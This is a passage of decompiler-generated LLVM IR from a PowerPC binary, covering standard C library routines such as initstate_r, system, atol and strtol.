  %v2_1000cf08 = inttoptr i32 %v0_1000cf1026 to i32*
  %v3_1000cf08 = call i32 @__GI_random_r(i32* %v2_1000cf08, i32 %v2_1000cf14)
  %v0_1000cf0c = load i32, i32* @r31, align 4
  %v1_1000cf0c = add i32 %v0_1000cf0c, -1
  store i32 %v1_1000cf0c, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_1000cf0c, -1
  br i1 %tmp20, label %dec_label_pc_1000cf08, label %dec_label_pc_1000cf1c

dec_label_pc_1000cf1c:                            ; preds = %dec_label_pc_1000ceec, %dec_label_pc_1000cf08, %dec_label_pc_1000ce88
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000cf20

dec_label_pc_1000cf20:                            ; preds = %entry, %dec_label_pc_1000cf1c
  %v0_1000cf20 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_1000cf1c ]
  store i32 %v0_1000ce54, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000cf20

; uselistorder directives
  uselistorder i32 %v1_1000cee8, { 1, 0 }
  uselistorder i32 %v2_1000cee4, { 1, 0 }
  uselistorder i32 %v2_1000ced8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000cec4, { 1, 0 }
  uselistorder i32 %v0_1000ceac, { 1, 2, 0 }
  uselistorder i32 %v3_1000ce94, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 3, 4, 1 }
  uselistorder label %dec_label_pc_1000cf20, { 1, 0 }
  uselistorder label %dec_label_pc_1000cf1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000cf08, { 1, 0 }
  uselistorder label %dec_label_pc_1000ceec, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000cee4, { 1, 0 }
  uselistorder label %dec_label_pc_1000cec4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ce88, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1000cf38 = icmp ugt i32 %arg2, 127
  %v0_1000cf40 = load i32, i32* @lr, align 4
  store i32 %v0_1000cf40, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_1000cf4c = sub i32 255, %arg2
  %v2_1000cf4c = sub i32 -1, %arg2
  %not.v5_1000cf4c = icmp ugt i32 %v1_1000cf4c, %v2_1000cf4c
  %v6_1000cf50 = sext i1 %not.v5_1000cf4c to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_1000cf58 = add i32 %tmp, 4
  store i32 %v1_1000cf58, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10016c14.340 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_1000cf70 = sub nsw i32 3, %v6_1000cf50
  store i32 %v1_1000cf70, i32* @r31, align 4
  br i1 %v2_1000cf38, label %dec_label_pc_1000cf98, label %dec_label_pc_1000cf78

dec_label_pc_1000cf78:                            ; preds = %entry
  %v2_1000cf64 = icmp ugt i32 %arg2, 31
  %v1_1000cf78 = sub i32 63, %arg2
  %not.v5_1000cf78 = icmp ugt i32 %v1_1000cf78, %v2_1000cf4c
  %v6_1000cf7c = sext i1 %not.v5_1000cf78 to i32
  %v1_1000cf84 = sub nsw i32 1, %v6_1000cf7c
  store i32 %v1_1000cf84, i32* @r31, align 4
  br i1 %v2_1000cf64, label %dec_label_pc_1000cf98, label %dec_label_pc_1000cf8c

dec_label_pc_1000cf8c:                            ; preds = %dec_label_pc_1000cf78
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_1000cff8, label %dec_label_pc_1000cf98

dec_label_pc_1000cf98:                            ; preds = %dec_label_pc_1000cf8c, %dec_label_pc_1000cf78, %entry
  %v0_1000cf98 = phi i32 [ 0, %dec_label_pc_1000cf8c ], [ %v1_1000cf84, %dec_label_pc_1000cf78 ], [ %v1_1000cf70, %entry ]
  %v1_1000cf98 = mul nsw i32 %v0_1000cf98, 4
  store i32 %v1_1000cf98, i32* %r0.global-to-local, align 4
  %v2_1000cf9c = add i32 %arg3, 12
  %v3_1000cf9c = inttoptr i32 %v2_1000cf9c to i32*
  store i32 %v0_1000cf98, i32* %v3_1000cf9c, align 4
  %v0_1000cfa0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000cfa0 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000cfa0 = add i32 %v1_1000cfa0, %v0_1000cfa0
  store i32 %v2_1000cfa0, i32* %r9.global-to-local, align 4
  %v3_1000cfa4 = inttoptr i32 %v2_1000cfa0 to i32*
  %v4_1000cfa4 = load i32, i32* %v3_1000cfa4, align 4
  store i32 %v4_1000cfa4, i32* %r0.global-to-local, align 4
  %v1_1000cfa8 = add i32 %v2_1000cfa0, 20
  %v2_1000cfa8 = inttoptr i32 %v1_1000cfa8 to i32*
  %v3_1000cfa8 = load i32, i32* %v2_1000cfa8, align 4
  store i32 %v3_1000cfa8, i32* %r9.global-to-local, align 4
  %v1_1000cfac = load i32, i32* %r30.global-to-local, align 4
  %v2_1000cfac = add i32 %v1_1000cfac, 20
  %v3_1000cfac = inttoptr i32 %v2_1000cfac to i32*
  store i32 %v4_1000cfa4, i32* %v3_1000cfac, align 4
  %v0_1000cfb0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cfb0 = mul i32 %v0_1000cfb0, 4
  store i32 %v1_1000cfb0, i32* %r0.global-to-local, align 4
  %v0_1000cfb4 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000cfb4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000cfb4 = add i32 %v1_1000cfb4, 8
  %v3_1000cfb4 = inttoptr i32 %v2_1000cfb4 to i32*
  store i32 %v0_1000cfb4, i32* %v3_1000cfb4, align 4
  %v0_1000cfb8 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000cfb8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000cfb8 = add i32 %v1_1000cfb8, %v0_1000cfb8
  store i32 %v2_1000cfb8, i32* %r0.global-to-local, align 4
  %v0_1000cfbc = load i32, i32* %r9.global-to-local, align 4
  %v1_1000cfbc = load i32, i32* %r30.global-to-local, align 4
  %v2_1000cfbc = add i32 %v1_1000cfbc, 16
  %v3_1000cfbc = inttoptr i32 %v2_1000cfbc to i32*
  store i32 %v0_1000cfbc, i32* %v3_1000cfbc, align 4
  %v0_1000cfc0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000cfc0 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000cfc0 = add i32 %v1_1000cfc0, 24
  %v3_1000cfc0 = inttoptr i32 %v2_1000cfc0 to i32*
  store i32 %v0_1000cfc0, i32* %v3_1000cfc0, align 4
  store i32 268488648, i32* @lr, align 4
  %v0_1000cfc4 = call i32 @srandom_r()
  %v0_1000cfc8 = load i32, i32* @r31, align 4
  %v3_1000cfc8 = icmp eq i32 %v0_1000cfc8, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000cfd4 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000cfd4 = inttoptr i32 %v1_1000cfd4 to i32*
  store i32 0, i32* %v2_1000cfd4, align 4
  br i1 %v3_1000cfc8, label %dec_label_pc_1000d00c, label %dec_label_pc_1000cfdc

dec_label_pc_1000cfdc:                            ; preds = %dec_label_pc_1000cf98
  %v0_1000cfdc = load i32, i32* @r30, align 4
  %v1_1000cfdc = add i32 %v0_1000cfdc, 4
  %v2_1000cfdc = inttoptr i32 %v1_1000cfdc to i32*
  %v3_1000cfdc = load i32, i32* %v2_1000cfdc, align 4
  %v0_1000cfe0 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000cfe0 = sub i32 %v3_1000cfdc, %v0_1000cfe0
  %v4_1000cfe4 = sdiv i32 %v2_1000cfe0, 4
  %v1_1000cfe8 = mul i32 %v4_1000cfe4, 5
  %v1_1000cfec = load i32, i32* @r31, align 4
  %v2_1000cfec = add i32 %v1_1000cfe8, %v1_1000cfec
  store i32 %v2_1000cfec, i32* %r0.global-to-local, align 4
  %v1_1000cff0 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000cff0 = inttoptr i32 %v1_1000cff0 to i32*
  store i32 %v2_1000cfec, i32* %v2_1000cff0, align 4
  br label %dec_label_pc_1000d00c

dec_label_pc_1000cff8:                            ; preds = %dec_label_pc_1000cf8c
  %v0_1000cff8 = call i32 @__errno_location()
  store i32 %v0_1000cff8, i32* %r3.global-to-local, align 4
  %v0_1000cffc = load i32, i32* %r28.global-to-local, align 4
  %v2_1000cffc = inttoptr i32 %v0_1000cff8 to i32*
  store i32 %v0_1000cffc, i32* %v2_1000cffc, align 4
  %v0_1000d000 = call i32 @__errno_location()
  %v0_1000d004 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000d004 = inttoptr i32 %v0_1000d000 to i32*
  store i32 %v0_1000d004, i32* %v2_1000d004, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d00c

dec_label_pc_1000d00c:                            ; preds = %dec_label_pc_1000cf98, %dec_label_pc_1000cfdc, %dec_label_pc_1000cff8
  store i32 %v0_1000cf40, i32* %r0.global-to-local, align 4
  %v0_1000d01c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000d01c

; uselistorder directives
  uselistorder i32 %v2_1000cfa0, { 1, 0, 2 }
  uselistorder i32 %v0_1000cf98, { 1, 0 }
  uselistorder i32 %v2_1000cf4c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10016c14.340 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_1000d00c, { 2, 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_1000d030 = icmp eq i32 %arg1, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000d030, label %dec_label_pc_1000d160, label %dec_label_pc_1000d040

dec_label_pc_1000d040:                            ; preds = %entry
  store i32 268488780, i32* @lr, align 4
  %v2_1000d048 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268488796, i32* @lr, align 4
  %v2_1000d058 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 268488812, i32* @lr, align 4
  %v2_1000d068 = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_1000d068, i32* @r3, align 4
  store i32 268488820, i32* @lr, align 4
  %v1_1000d070 = call i32 @__vfork(i32 %v2_1000d068)
  store i32 %v1_1000d070, i32* @r31, align 4
  %tmp10 = icmp sgt i32 %v1_1000d070, -1
  br i1 %tmp10, label %dec_label_pc_1000d0a8, label %dec_label_pc_1000d07c

dec_label_pc_1000d07c:                            ; preds = %dec_label_pc_1000d040
  store i32 268488840, i32* @lr, align 4
  %v2_1000d084 = call i32 @__bsd_signal(i32 3, i32 %v2_1000d048)
  store i32 268488852, i32* @lr, align 4
  %v2_1000d090 = call i32 @__bsd_signal(i32 2, i32 %v2_1000d058)
  store i32 268488864, i32* @lr, align 4
  %v2_1000d09c = call i32 @__bsd_signal(i32 17, i32 %v2_1000d068)
  br label %dec_label_pc_1000d160

dec_label_pc_1000d0a8:                            ; preds = %dec_label_pc_1000d040
  %v3_1000d074 = icmp eq i32 %v1_1000d070, 0
  br i1 %v3_1000d074, label %dec_label_pc_1000d0ac, label %dec_label_pc_1000d100

dec_label_pc_1000d0ac:                            ; preds = %dec_label_pc_1000d0a8
  store i32 268488888, i32* @lr, align 4
  %v2_1000d0b4 = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 268488900, i32* @lr, align 4
  %v2_1000d0c0 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 268488912, i32* @lr, align 4
  %v2_1000d0cc = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_1000d0f4 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_10016c3c.342 to i32), i32 ptrtoint ([3 x i8]* @global_var_10016c44.343 to i32), i32 ptrtoint ([3 x i8]* @global_var_10016c48.344 to i32), i32 %arg1, i32 0)
  %v1_1000d0fc = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_1000d100

dec_label_pc_1000d100:                            ; preds = %dec_label_pc_1000d0a8, %dec_label_pc_1000d0ac
  store i32 268488972, i32* @lr, align 4
  %v2_1000d108 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268488984, i32* @lr, align 4
  %v2_1000d114 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_1000d118 = load i32, i32* @r31, align 4
  %v2_1000d11c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268489004, i32* @lr, align 4
  %v4_1000d128 = call i32 @wait4(i32 %v0_1000d118, i32 %v2_1000d11c, i32 0, i32 0)
  %v3_1000d12c = icmp eq i32 %v4_1000d128, -1
  br i1 %v3_1000d12c, label %dec_label_pc_1000d134, label %dec_label_pc_1000d138

dec_label_pc_1000d134:                            ; preds = %dec_label_pc_1000d100
  store i32 -1, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1000d138

dec_label_pc_1000d138:                            ; preds = %dec_label_pc_1000d100, %dec_label_pc_1000d134
  store i32 268489028, i32* @lr, align 4
  %v2_1000d140 = call i32 @__bsd_signal(i32 3, i32 %v2_1000d048)
  store i32 268489040, i32* @lr, align 4
  %v2_1000d14c = call i32 @__bsd_signal(i32 2, i32 %v2_1000d058)
  store i32 268489052, i32* @lr, align 4
  %v2_1000d158 = call i32 @__bsd_signal(i32 17, i32 %v2_1000d068)
  %v3_1000d15c = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1000d160

dec_label_pc_1000d160:                            ; preds = %entry, %dec_label_pc_1000d07c, %dec_label_pc_1000d138
  %v0_1000d170 = phi i32 [ 1, %entry ], [ -1, %dec_label_pc_1000d07c ], [ %v3_1000d15c, %dec_label_pc_1000d138 ]
  ret i32 %v0_1000d170

; uselistorder directives
  uselistorder i32 %v1_1000d070, { 1, 0, 2 }
  uselistorder i32 %v2_1000d068, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000d058, { 1, 0 }
  uselistorder i32 %v2_1000d048, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d160, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d138, { 1, 0 }
  uselistorder label %dec_label_pc_1000d100, { 1, 0 }
}

define i32 @atol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_1000d17c = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_1000d17c
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_1000d184 = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_1000d184
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000d198 = load i32, i32* @r4, align 4
  store i32 %v0_1000d198, i32* %r25.global-to-local, align 4
  %v0_1000d1a0 = load i32, i32* @r5, align 4
  store i32 %v0_1000d1a0, i32* %r30.global-to-local, align 4
  %v0_1000d1a4 = load i32, i32* @r6, align 4
  store i32 %v0_1000d1a4, i32* %r26.global-to-local, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1000d1ac = load i32, i32* @global_var_1002c2d0, align 4
  br label %dec_label_pc_1000d1b8

dec_label_pc_1000d1b4:                            ; preds = %dec_label_pc_1000d1b8
  %v1_1000d1b4 = add i32 %v0_1000d1ec, 1
  store i32 %v1_1000d1b4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d1b8

dec_label_pc_1000d1b8:                            ; preds = %entry, %dec_label_pc_1000d1b4
  %v0_1000d1ec = phi i32 [ %tmp, %entry ], [ %v1_1000d1b4, %dec_label_pc_1000d1b4 ]
  %v1_1000d1b8 = inttoptr i32 %v0_1000d1ec to i8*
  %v2_1000d1b8 = load i8, i8* %v1_1000d1b8, align 1
  %v3_1000d1b8 = zext i8 %v2_1000d1b8 to i32
  store i32 %v3_1000d1b8, i32* @r11, align 4
  %v1_1000d1bc = mul nuw nsw i32 %v3_1000d1b8, 2
  %v2_1000d1c0 = add i32 %v1_1000d1bc, %v3_1000d1ac
  %v3_1000d1c0 = inttoptr i32 %v2_1000d1c0 to i16*
  %v4_1000d1c0 = load i16, i16* %v3_1000d1c0, align 2
  %v1_1000d1c4 = and i16 %v4_1000d1c0, 32
  %v3_1000d1c4 = icmp eq i16 %v1_1000d1c4, 0
  br i1 %v3_1000d1c4, label %dec_label_pc_1000d1cc, label %dec_label_pc_1000d1b4

dec_label_pc_1000d1cc:                            ; preds = %dec_label_pc_1000d1b8
  %v3_1000d1cc = icmp eq i8 %v2_1000d1b8, 43
  br i1 %v3_1000d1cc, label %dec_label_pc_1000d1ec, label %dec_label_pc_1000d1d4

dec_label_pc_1000d1d4:                            ; preds = %dec_label_pc_1000d1cc
  %v3_1000d1d4 = icmp eq i8 %v2_1000d1b8, 45
  store i32 0, i32* %r28.global-to-local, align 4
  br i1 %v3_1000d1d4, label %dec_label_pc_1000d1ec, label %dec_label_pc_1000d1f0

dec_label_pc_1000d1ec:                            ; preds = %dec_label_pc_1000d1cc, %dec_label_pc_1000d1d4
  %storemerge = phi i32 [ 1, %dec_label_pc_1000d1d4 ], [ 0, %dec_label_pc_1000d1cc ]
  store i32 %storemerge, i32* %r28.global-to-local, align 4
  %v1_1000d1ec = add i32 %v0_1000d1ec, 1
  store i32 %v1_1000d1ec, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d1f0

dec_label_pc_1000d1f0:                            ; preds = %dec_label_pc_1000d1d4, %dec_label_pc_1000d1ec
  %v1_1000d1f0 = call i32 @__asm_rlwinm.(i32 %v0_1000d1a0, i32 0, i32 28, i32 26)
  %v4_1000d1f0 = icmp eq i32 %v1_1000d1f0, 0
  store i32 %tmp, i32* @r10, align 4
  br i1 %v4_1000d1f0, label %dec_label_pc_1000d1fc, label %dec_label_pc_1000d1f0.dec_label_pc_1000d238_crit_edge

dec_label_pc_1000d1f0.dec_label_pc_1000d238_crit_edge: ; preds = %dec_label_pc_1000d1f0
  %v0_1000d238.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d238

dec_label_pc_1000d1fc:                            ; preds = %dec_label_pc_1000d1f0
  %v0_1000d1fc = load i32, i32* %r31.global-to-local, align 4
  %v1_1000d1fc = inttoptr i32 %v0_1000d1fc to i8*
  %v2_1000d1fc = load i8, i8* %v1_1000d1fc, align 1
  %v0_1000d200 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000d200 = add i32 %v0_1000d200, 10
  store i32 %v1_1000d200, i32* %r30.global-to-local, align 4
  %v3_1000d204 = icmp eq i8 %v2_1000d1fc, 48
  br i1 %v3_1000d204, label %dec_label_pc_1000d20c, label %dec_label_pc_1000d22c

dec_label_pc_1000d20c:                            ; preds = %dec_label_pc_1000d1fc
  %v1_1000d20c = add i32 %v0_1000d1fc, 1
  %v2_1000d20c = inttoptr i32 %v1_1000d20c to i8*
  %v3_1000d20c = load i8, i8* %v2_1000d20c, align 1
  %v4_1000d20c = zext i8 %v3_1000d20c to i32
  store i32 %v1_1000d20c, i32* %r31.global-to-local, align 4
  %v1_1000d210 = add i32 %v0_1000d200, 8
  store i32 %v1_1000d210, i32* %r30.global-to-local, align 4
  %v1_1000d214 = or i32 %v4_1000d20c, 32
  store i32 %v1_1000d20c, i32* @r10, align 4
  %v3_1000d21c = icmp eq i32 %v1_1000d214, 120
  br i1 %v3_1000d21c, label %dec_label_pc_1000d224, label %dec_label_pc_1000d22c

dec_label_pc_1000d224:                            ; preds = %dec_label_pc_1000d20c
  %v1_1000d224 = mul i32 %v1_1000d210, 2
  store i32 %v1_1000d224, i32* %r30.global-to-local, align 4
  %v1_1000d228 = add i32 %v0_1000d1fc, 2
  store i32 %v1_1000d228, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d22c

dec_label_pc_1000d22c:                            ; preds = %dec_label_pc_1000d20c, %dec_label_pc_1000d1fc, %dec_label_pc_1000d224
  %v0_1000d2e015 = phi i32 [ %v1_1000d20c, %dec_label_pc_1000d224 ], [ %tmp, %dec_label_pc_1000d1fc ], [ %v1_1000d20c, %dec_label_pc_1000d20c ]
  %v0_1000d22c = phi i32 [ %v1_1000d224, %dec_label_pc_1000d224 ], [ %v1_1000d200, %dec_label_pc_1000d1fc ], [ %v1_1000d210, %dec_label_pc_1000d20c ]
  %tmp22 = icmp slt i32 %v0_1000d22c, 17
  br i1 %tmp22, label %dec_label_pc_1000d238, label %dec_label_pc_1000d234

dec_label_pc_1000d234:                            ; preds = %dec_label_pc_1000d22c
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000d238

dec_label_pc_1000d238:                            ; preds = %dec_label_pc_1000d1f0.dec_label_pc_1000d238_crit_edge, %dec_label_pc_1000d22c, %dec_label_pc_1000d234
  %v0_1000d2e014 = phi i32 [ %tmp, %dec_label_pc_1000d1f0.dec_label_pc_1000d238_crit_edge ], [ %v0_1000d2e015, %dec_label_pc_1000d22c ], [ %v0_1000d2e015, %dec_label_pc_1000d234 ]
  %v1_1000d24c = phi i32 [ %v0_1000d238.pre, %dec_label_pc_1000d1f0.dec_label_pc_1000d238_crit_edge ], [ %v0_1000d22c, %dec_label_pc_1000d22c ], [ 16, %dec_label_pc_1000d234 ]
  %v1_1000d238 = add i32 %v1_1000d24c, -2
  store i32 0, i32* @r8, align 4
  %v2_1000d240 = icmp ugt i32 %v1_1000d238, 34
  br i1 %v2_1000d240, label %dec_label_pc_1000d2d8, label %dec_label_pc_1000d248

dec_label_pc_1000d248:                            ; preds = %dec_label_pc_1000d238
  %v2_1000d24c = udiv i32 -1, %v1_1000d24c
  store i32 %v2_1000d24c, i32* %r29.global-to-local, align 4
  %v2_1000d250 = mul i32 %v2_1000d24c, %v1_1000d24c
  %v1_1000d254 = sub i32 -1, %v2_1000d250
  %v1_1000d258 = urem i32 %v1_1000d254, 256
  store i32 %v1_1000d258, i32* %r27.global-to-local, align 4
  %v0_1000d264.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d264

dec_label_pc_1000d260:                            ; preds = %dec_label_pc_1000d2cc, %dec_label_pc_1000d2b4
  %v1_1000d268.pre = phi i32 [ %v1_1000d26c, %dec_label_pc_1000d2cc ], [ %v1_1000d268.pre.pre, %dec_label_pc_1000d2b4 ]
  %v0_1000d268.pre = phi i32 [ %v2_1000d2d0, %dec_label_pc_1000d2cc ], [ %v0_1000d268.pre.pre, %dec_label_pc_1000d2b4 ]
  %v0_1000d260 = phi i32 [ %v1_1000d270, %dec_label_pc_1000d2cc ], [ %v0_1000d260.pre, %dec_label_pc_1000d2b4 ]
  store i32 %v0_1000d260, i32* @r10, align 4
  br label %dec_label_pc_1000d264

dec_label_pc_1000d264:                            ; preds = %dec_label_pc_1000d248, %dec_label_pc_1000d260
  %v0_1000d2e012 = phi i32 [ %v0_1000d2e014, %dec_label_pc_1000d248 ], [ %v0_1000d260, %dec_label_pc_1000d260 ]
  %v0_1000d270 = phi i32 [ %v0_1000d264.pre, %dec_label_pc_1000d248 ], [ %v0_1000d260, %dec_label_pc_1000d260 ]
  %v1_1000d26c = phi i32 [ %v2_1000d24c, %dec_label_pc_1000d248 ], [ %v1_1000d268.pre, %dec_label_pc_1000d260 ]
  %v0_1000d2cc = phi i32 [ 0, %dec_label_pc_1000d248 ], [ %v0_1000d268.pre, %dec_label_pc_1000d260 ]
  %v1_1000d264 = inttoptr i32 %v0_1000d270 to i8*
  %v2_1000d264 = load i8, i8* %v1_1000d264, align 1
  %v3_1000d264 = zext i8 %v2_1000d264 to i32
  %v3_1000d268 = icmp ugt i32 %v0_1000d2cc, %v1_1000d26c
  %v1_1000d270 = add i32 %v0_1000d270, 1
  store i32 %v1_1000d270, i32* %r31.global-to-local, align 4
  %v1_1000d274 = add nsw i32 %v3_1000d264, -48
  %v1_1000d278 = or i32 %v3_1000d264, 32
  %v1_1000d27c = urem i32 %v1_1000d274, 256
  store i32 %v1_1000d27c, i32* @r11, align 4
  %tmp23 = icmp ult i32 %v1_1000d27c, 10
  br i1 %tmp23, label %dec_label_pc_1000d29c, label %dec_label_pc_1000d28c

dec_label_pc_1000d28c:                            ; preds = %dec_label_pc_1000d264
  store i32 40, i32* @r11, align 4
  %tmp24 = icmp ult i32 %v1_1000d278, 97
  br i1 %tmp24, label %dec_label_pc_1000d29c, label %dec_label_pc_1000d298

dec_label_pc_1000d298:                            ; preds = %dec_label_pc_1000d28c
  %v1_1000d28c = add nsw i32 %v1_1000d278, -87
  %v1_1000d298 = urem i32 %v1_1000d28c, 256
  store i32 %v1_1000d298, i32* @r11, align 4
  br label %dec_label_pc_1000d29c

dec_label_pc_1000d29c:                            ; preds = %dec_label_pc_1000d28c, %dec_label_pc_1000d264, %dec_label_pc_1000d298
  %v1_1000d2d0 = phi i32 [ 40, %dec_label_pc_1000d28c ], [ %v1_1000d27c, %dec_label_pc_1000d264 ], [ %v1_1000d298, %dec_label_pc_1000d298 ]
  %v1_1000d29c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d29c = icmp slt i32 %v1_1000d2d0, %v1_1000d29c
  br i1 %v2_1000d29c, label %dec_label_pc_1000d2a4, label %dec_label_pc_1000d2d8

dec_label_pc_1000d2a4:                            ; preds = %dec_label_pc_1000d29c
  br i1 %v3_1000d268, label %dec_label_pc_1000d2b4, label %dec_label_pc_1000d2a8

dec_label_pc_1000d2a8:                            ; preds = %dec_label_pc_1000d2a4
  %v1_1000d2a8 = load i32, i32* %r27.global-to-local, align 4
  %v0_1000d2ac.not = icmp ne i32 %v0_1000d2cc, %v1_1000d26c
  %tmp25 = icmp ule i32 %v1_1000d2d0, %v1_1000d2a8
  %or.cond = or i1 %tmp25, %v0_1000d2ac.not
  br i1 %or.cond, label %dec_label_pc_1000d2cc, label %dec_label_pc_1000d2b4

dec_label_pc_1000d2b4:                            ; preds = %dec_label_pc_1000d2a8, %dec_label_pc_1000d2a4
  %v0_1000d2b4 = call i32 @__errno_location()
  %v0_1000d2b8 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000d2b8 = load i32, i32* %r26.global-to-local, align 4
  %v2_1000d2b8 = and i32 %v1_1000d2b8, %v0_1000d2b8
  store i32 %v2_1000d2b8, i32* %r28.global-to-local, align 4
  store i32 -1, i32* @r8, align 4
  %v2_1000d2c4 = inttoptr i32 %v0_1000d2b4 to i32*
  store i32 34, i32* %v2_1000d2c4, align 4
  %v0_1000d260.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000d268.pre.pre = load i32, i32* @r8, align 4
  %v1_1000d268.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000d260

dec_label_pc_1000d2cc:                            ; preds = %dec_label_pc_1000d2a8
  %v2_1000d2cc = mul i32 %v1_1000d29c, %v0_1000d2cc
  %v2_1000d2d0 = add i32 %v2_1000d2cc, %v1_1000d2d0
  store i32 %v2_1000d2d0, i32* @r8, align 4
  br label %dec_label_pc_1000d260

dec_label_pc_1000d2d8:                            ; preds = %dec_label_pc_1000d29c, %dec_label_pc_1000d238
  %v0_1000d2e0 = phi i32 [ %v0_1000d2e014, %dec_label_pc_1000d238 ], [ %v0_1000d2e012, %dec_label_pc_1000d29c ]
  %v0_1000d2d8 = load i32, i32* %r25.global-to-local, align 4
  %v3_1000d2d8 = icmp eq i32 %v0_1000d2d8, 0
  br i1 %v3_1000d2d8, label %dec_label_pc_1000d2e4, label %dec_label_pc_1000d2e0

dec_label_pc_1000d2e0:                            ; preds = %dec_label_pc_1000d2d8
  %v2_1000d2e0 = inttoptr i32 %v0_1000d2d8 to i32*
  store i32 %v0_1000d2e0, i32* %v2_1000d2e0, align 4
  br label %dec_label_pc_1000d2e4

dec_label_pc_1000d2e4:                            ; preds = %dec_label_pc_1000d2d8, %dec_label_pc_1000d2e0
  %v0_1000d2e4 = load i32, i32* %r26.global-to-local, align 4
  %v3_1000d2e4 = icmp eq i32 %v0_1000d2e4, 0
  %v0_1000d2e8 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000d2e8 = sub i32 0, %v0_1000d2e8
  %tmp27 = lshr i32 %v1_1000d2e8, 31
